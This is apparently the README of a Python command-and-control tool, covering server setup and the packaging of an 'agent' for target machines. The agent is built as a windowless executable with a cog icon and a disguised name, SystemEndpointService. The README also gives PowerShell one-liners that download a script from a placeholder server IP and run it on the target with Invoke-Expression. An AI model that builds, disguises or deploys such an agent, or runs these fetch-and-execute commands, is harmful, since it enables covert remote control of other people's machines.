



## Installation
Clone the repository and then install virtual environment:
```bash
python3 -m venv venv
```
Next, activate virtual environment:
```bash
source venv/bin/activate  # On macOS/Linux
venv\Scripts\activate     # On Windows
```
Then, install all the required packages:
```bash
pip install -r requirements.txt
```

## Server
You should include 3 JSON files in /server directory: agents.json, commands_output.json, commands.json

Run the server:
```bash
python server/server.py
```

## Agent
### Run agent from python file
```bash
python agent/agent.py
```
### Install EXE
```bash
pyinstaller --onefile --noconsole --icon=cog.ico agent.py
```

### Install EXE (with a different name)
```bash
pyinstaller --onefile --noconsole --icon=cog.ico --name=ExeName agent.py
```

### Install EXE (with a name + a custom version file)
```bash
pyinstaller --onefile --noconsole --icon=cog.ico --name=ExeName --version-file=version.txt agent.py
```

## Custom powershell script usage:

To run custom powershell scripts on target machine (Agent), you can execute this command:
```powershell
Invoke-Expression ( [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "http://[SERVER_IP]:5000/static/scripts/script.ps1").Content) )
```

Change wallpaper to cat image:
```powershell
Invoke-Expression ( [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "http://[SERVER_IP]:5000/static/scripts/wallpaper.ps1").Content) )
```

Amilnen istifade elediyimiz pyinstaller (exe duzelden):
```
python -m PyInstaller --onefile --noconsole --icon=cog.ico --name=SystemEndpointService agent.py
```
